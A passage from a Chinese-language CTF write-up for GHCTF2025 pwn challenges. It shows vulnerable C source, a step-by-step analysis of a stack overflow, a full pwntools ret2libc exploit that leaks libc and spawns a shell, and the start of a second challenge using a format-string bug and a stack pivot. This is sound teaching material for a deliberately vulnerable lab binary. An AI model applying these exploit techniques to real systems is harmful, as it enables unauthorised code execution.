class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">10</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">100</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">100</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">20</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">20</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Invalid choose\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">books</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">        <span class="type">int</span> choose;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Which kind of books would you like buy?\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1.story books $10\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2.novel books $80\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3.note books $20\n&quot;</span>);</span><br><span class="line">        choose = read_count();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;How many books do you want to buy?\n&quot;</span>);</span><br><span class="line">        count = read_count();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(choose)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">10</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">10</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">80</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">80</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">20</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">20</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Invalid choose\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hell_money</span><span class="params">()</span>&#123;    </span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1$ = 1000hell_money\n&quot;</span>);     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How much do you want to spend buying the hell_money?\n&quot;</span>);</span><br><span class="line">    count = read_count();</span><br><span class="line">    <span class="keyword">if</span>(money &lt; count) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);   </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        what_can_I_say += count*<span class="number">1000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clothing</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the price of clothing is 50$\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How much do you want to buy\n&quot;</span>);</span><br><span class="line">    count = read_count();</span><br><span class="line">    <span class="keyword">if</span>(money &lt; count * <span class="number">50</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">            money -= <span class="number">50</span>*count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shop</span><span class="params">()</span>&#123;</span><br><span class="line">        </span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x40</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Do you want to buy my shop?\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(money &gt; <span class="number">100000</span>)&#123;</span><br><span class="line">                </span><br><span class="line">        money -= <span class="number">100000</span>;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;give you my shop!!!\n&quot;</span>); </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;You can name it!!!\n&quot;</span>);    </span><br><span class="line">        read(<span class="number">0</span>,name,<span class="number">0x80</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;roll!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">see_it</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Barter?!1000$ = 1hell_money\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How much do you exchange?&quot;</span>);</span><br><span class="line">    count = read_count();</span><br><span class="line">    what_can_I_say -=count;</span><br><span class="line">    money += count * <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_count</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> ch[<span class="number">8</span>];</span><br><span class="line">    read(<span class="number">0</span>,ch,<span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">return</span> atoi(ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_money</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you have %d $\n&quot;</span>,money);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you have %d hell_money\n&quot;</span>,what_can_I_say);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> ch[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                menu();</span><br><span class="line">                <span class="keyword">switch</span>(read_count())</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                                flower();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                                books();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                                hell_money();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                                clothing();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                                shop();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                                check_money();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                                see_it();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;Invalid choose\n&quot;</span>);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ret2libc1_分析1"><a href="#ret2libc1-分析1" class="headerlink" title="ret2libc1_分析1"></a>ret2libc1_分析1</h2><ul>
<li>拿到附件后老样子，还是先来<code>check</code>一下保护机制。发现没有开启<code>canary</code>和<code>pie</code></li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309193608288.png" alt="image-20250309193608288"></p>
<ul>
<li>现在我们就来使用<code>IDA pro</code>对该程序进行反编译，先来查看一下<code>main</code>函数。这里<code>main</code>函数主要的执行逻辑就<code>3</code>点概括<ul>
<li>先输入输出初始化</li>
<li>进入循环，打印菜单，并且要用户输入选项</li>
<li>之后通过<code>switch</code>语句执行对应的选项。</li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309195517274.png" alt="image-20250309195517274"></p>
<ul>
<li>然后我们查看菜单<code>menu()</code>，这个函数结合<code>main()</code>函数中的<code>switch</code>语句进行分析。这时我们发现：<ul>
<li>菜单中只有<code>6</code>个选项，而<code>main()</code>函数中却有<code>7</code>个选项，并且第<code>7</code>个选项还是<code>see_it</code></li>
<li>这时就会想到<code>see_it()</code>这个函数可能会有点问题</li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309200149427.png" alt="image-20250309200149427"></p>
<ul>
<li>接下来我们还是逐个函数进行分析，先来分析<code>flower()</code>这个函数，我们将这个函数分为四个部分进行解读<ul>
<li>这就是模拟商店买花的一个函数</li>
<li>首先我们要确定买哪一种花，然后确定买多少朵这种花</li>
<li>之后我们就会根据我们所买花的种类进入相应的<code>case</code>，然后扣除相应的<code>money</code></li>
<li>在这里<code>money</code>是一个全局变量，保存在<code>bss</code>段上</li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309200451652.png" alt="image-20250309200451652"></p>
<ul>
<li>接下来我们查看<code>books()</code>这个函数的逻辑也和<code>flower()</code>这个函数也一样<ul>
<li>也就是选择我们要买的书的种类和个数</li>
<li>然后进入对应的<code>case</code>语句</li>
<li>执行对应的判断语句以及扣钱</li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309201346140.png" alt="image-20250309201346140"></p>
<ul>
<li>然后我们来查看<code>hell_money</code><ul>
<li>这个函数主要执行的就是使用<code>money</code>对换<code>hell_money</code>，<code>1money=1000hell_money</code></li>
<li>并且会对<code>hell_money</code>统计，将得到的<code>hell_money</code>的总数保存在全局变量中<code>what_can_I_say</code></li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309201829207.png" alt="image-20250309201829207"></p>
<ul>
<li>来看<code>clothing()</code>这个函数<ul>
<li>这个函数实现的就是购买衣服</li>
<li>购买后就会扣除相应的钱</li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309202152701.png" alt="image-20250309202152701"></p>
<ul>
<li>现在来查看<code>shop()</code>函数<ul>
<li>这个函数就是让我们购买这一整个商店</li>
<li>买完这个商店后就可以对这个商店进行命名</li>
<li>注意这边就存在一个栈溢出的漏洞</li>
<li>所以我们要想办法把<code>money</code>增加到大于<code>100000</code></li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309202443440.png" alt="image-20250309202443440"></p>
<ul>
<li>在来查看<code>see_it()</code><ul>
<li>这边的话我们可以使用<code>hell_money</code>来换取<code>money</code></li>
<li>只要我们有足够的<code>hell_money</code>就可以换取足够的<code>money</code>，从而可以买下整个<code>shop</code>给<code>shop</code>命名</li>
<li>然后我们就可以进行栈溢出，<code>ret2libc</code>利用</li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309202554215.png" alt="image-20250309202554215"></p>
<ul>
<li>这里我们再来查看一下全局变量和<code>data</code>段，会发现我们一开始的<code>what_can_I_say</code>变量的值为<code>？</code>，然后<code>moeny</code>一开始的值为<code>0x3e8</code></li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309203846322.png" alt="image-20250309203846322"></p>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309203839855.png" alt="image-20250309203839855"></p>
<ul>
<li>所以我们本题的思路就是不断用<code>money</code>购买<code>holl_money</code>然后用<code>holl_money</code>购买<code>money</code>使得<code>money</code>能购买整个商店，然后<code>ret2libc</code></li>
<li>这题就不动态调试了</li>
</ul>
<h2 id="ret2libc1_exp"><a href="#ret2libc1-exp" class="headerlink" title="ret2libc1_exp"></a>ret2libc1_exp</h2><ul>
<li>exp如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&quot;tmux&quot;, &quot;neww&quot;]</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2libc11&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28496</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hell_money</span>(<span class="params">count</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(count).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">see_it</span>(<span class="params">count</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(count).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400d73</span></span><br><span class="line">ret = <span class="number">0x400579</span></span><br><span class="line">printf_got = <span class="number">0x602020</span></span><br><span class="line">func_addr = <span class="number">0x400B1E</span></span><br><span class="line">printf_plt = <span class="number">0x4005A0</span></span><br><span class="line">hell_money(<span class="number">100</span>)</span><br><span class="line">pause()</span><br><span class="line">see_it(<span class="number">10000</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(ret)+p64(pop_rdi)+p64(printf_got)+p64(printf_plt)</span><br><span class="line">payload += p64(func_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;it!!!\n&#x27;</span>)</span><br><span class="line">printf_addr = p.recvline()[:<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf--&gt;&#x27;</span>,printf_addr)</span><br><span class="line">printf_addr = <span class="built_in">int</span>.from_bytes(printf_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">libc_addr = printf_addr -libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
<h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><ul>
<li><p>考点：<code>ret2libc</code>、<code>栈迁移</code>、<code>字符串格式化漏洞</code>，<code>ogg</code>、<code>在libc找rop</code></p>
</li>
<li><p>本题其实使用<code>system(&quot;/bin/sh&quot;)</code>或者<code>ogg</code>都可以打得出来，在使用<code>system(&quot;/bin/sh&quot;)</code>的时候可能需要稍微调整一下栈的距离</p>
</li>
<li>这题感觉是出的最有问题的一题，虽然考点比较多，给出的<code>ogg</code>本意是想让新生们了解一下<code>ogg</code>这个东西，为以后打堆的时候劫持<code>hook</code>的学习打下铺垫，这题还可以让新生知道，<code>libc</code>中也可以找<code>rop</code>链</li>
<li>源代码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">gitf</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> str[<span class="number">0x10</span>]=<span class="string">&quot;hello world!\n&quot;</span>;</span><br><span class="line">        <span class="type">char</span> str1[<span class="number">0x20</span>];</span><br><span class="line">        <span class="built_in">printf</span>(str);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;give you a gift.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;show your magic\n&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,str1,<span class="number">0x60</span>);</span><br><span class="line">        __asm__(<span class="string">&quot;lea -0x30(%rbp),%rax;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        init();</span><br><span class="line">        func();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ret2libc2_分析1"><a href="#ret2libc2-分析1" class="headerlink" title="ret2libc2_分析1"></a>ret2libc2_分析1</h2><ul>
<li>我们来<code>check</code>一下这个附件，发现并没有开启<code>PIE</code>保护也没有开启<code>Canary</code>保护</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309222120594.png" alt="image-20250309222120594"></p>
<ul>
<li>接下来使用<code>IDA pro</code>对附件进行反编译，查看一下代码，先来查看一下<code>main</code>函数，<code>main</code>函数会调用<code>init</code>函数对输入输出进行初始化</li>
<li>然后就调用<code>func</code>函数</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309222442715.png" alt="image-20250309222442715"></p>
<ul>
<li>接下来我们就来分析<code>func()</code>函数<ul>
<li>这个函数首先会输出<code>hello world!</code>，注意这里存在一个格式化字符的漏洞</li>
<li>但是在<code>printf</code>输出<code>format</code>的内容之前，并没有<code>read</code>，并不能修改<code>format</code>的内容</li>
<li>我们先接下去看，这时我们看到这边存在一个栈溢出，并且<strong>很重要的一点</strong>就是我们我们read写入<code>buf</code>的地址比<code>format</code>的地址更低</li>
<li>所以我们在溢出<code>buf</code>的时候，我们同时也可以改写<code>format</code>的内容</li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309222559379.png" alt="image-20250309222559379"></p>
<ul>
<li>接下来我们查看一下这个函数的汇编形式，我们可以注意到，在调用<code>read</code>函数后有一个<code>lea rax,[rbp+buf]</code>这个地址。这时我们溢出的时候就可以对这个<code>rax</code>进行一些利用</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309223051762.png" alt="image-20250309223051762"></p>
<ul>
<li>这时我们再查看这个程序的<code>rop</code>链，发现这个程序并没有我们想要的<code>gadget</code></li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309223347969.png" alt="image-20250309223347969"></p>
<ul>
<li>所以我们就只能找别的方式利用栈溢出漏洞和字符串格式化漏洞。由于没有开启<code>PIE</code>，我们就可以先将这个程序返回到<code>mov rdi,rax</code>这个指令，我们就可以再次使用<code>printf</code>函数输出<code>format</code>的内容，而这次输出的<code>format</code>内容我们就不会输出<code>hello world!</code>。而是我们<code>read()</code>，溢出的一部分内容。</li>
<li>所以我们使用<code>read</code>在<code>format</code>这个地址中读入<code>%n$p</code>，这样我们就可以泄露指定地址</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309223455358.png" alt="image-20250309223455358"></p>
<h2 id="ret2libc2_分析2"><a href="#ret2libc2-分析2" class="headerlink" title="ret2libc2_分析2"></a>ret2libc2_分析2</h2><ul>
<li>接下来我们就可以动态调试查看一下调用<code>printf</code>时，确定偏移量，泄露栈上的libc地址。</li>
<li>这边可以泄露<code>__libc_start_call_main+128</code>的地址，这时我们可以确定偏移地址<code>0x7+0x9-1=0xF</code>（这个是错误的）<strong>注意并不能通过现在rsp指针指向的位置算出偏移，我们因为我们是修改返回地址，再调用<code>printf</code>函数泄露地址，但是在我们<code>ret</code>之前，我们执行了<code>leave</code>这个汇编代码，改变了<code>rsp</code>的值，所以我们真正确定偏移的时候应该是在执行<code>leave</code>语句后再确定偏移</strong></li>
<li>但是这个地址需要我们反编译<code>libc.so</code>文件，所以我在泄露的时候并不是泄露这个地址</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309224059341.png" alt="image-20250309224059341"></p>
<ul>
<li>我们接下去查看，会发现这边还可以泄露另一个<code>libc</code>的地址，即<code>__libc_start_main+128</code>，我们选用这个地址，这样可以使用<code>pwntools</code>自带的一些函数快速寻找到偏移</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309224319279.png" alt="image-20250309224319279"></p>
<ul>
<li>现在我们来真正确定偏移，我们才能计算出真正的偏移<ul>
<li><code>__libc_start_call_main+128</code>：<code>0x2+0x6-0x1=0x7</code></li>
<li><code>__libc_start_main+128</code>：<code>0x16+0x6-0x1=0x1B</code></li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309225237277.png" alt="image-20250309225237277"></p>
<ul>
<li>这边我们泄露了地址后，我们就可以对地址接收，然后得到<code>libc</code>的地址。</li>
<li><strong>这里还需要注意一点</strong>在第一次进行栈溢出操作的时候需要进行栈迁移操作，否则第二次程序在执行<code>ret</code>之前又会执行一次，<code>leave</code>操作</li>
<li>如果我们在栈溢出时随便填写<code>rbp</code>指向地址里面的内容就会出现一个问题，第一次<code>leave</code>后<code>rbp</code>跑到了不存在的内存地址。第二次<code>leave</code>时就会出现段错误</li>
<li>在第二次溢出的时候，还会执行一次<code>leave</code>，这时的<code>rbp</code>指向的位置，也不能随便覆盖一个值，也需要覆盖一个可读可写的地址</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310004005221.png" alt="image-20250310004005221"></p>
<ul>
<li>为什么栈迁移这边有做详细分析<a href="https://iyheart.github.io/2024/06/18/CTFblog/PWN系列blog/关于PWN中的疑问/">关于PWN中的疑问 | iyheart的博客</a></li>
<li><p>这里在栈迁移的时候还需要注意几点：</p>
<ul>
<li>栈迁移时最好不要迁移到<code>.bss</code>段开头的位置，否则之后在执行<code>system(&quot;/bin/sh&quot;)</code>时会将栈地址降低，这时栈地址跑到了不能可读可写的段上去了。</li>
<li>我们在栈迁移的时候最好就是迁移到<code>.bss</code>段偏高一点的地方。</li>
</ul>
</li>
<li><p>泄露之后就是正常的<code>ret2libc</code>去打了，这里其实<code>system(&quot;/bin/sh&quot;)</code>也可以打的出来，栈迁移时，迁移到的<code>.bss</code>段地址再高一点就不会报错</p>
</li>
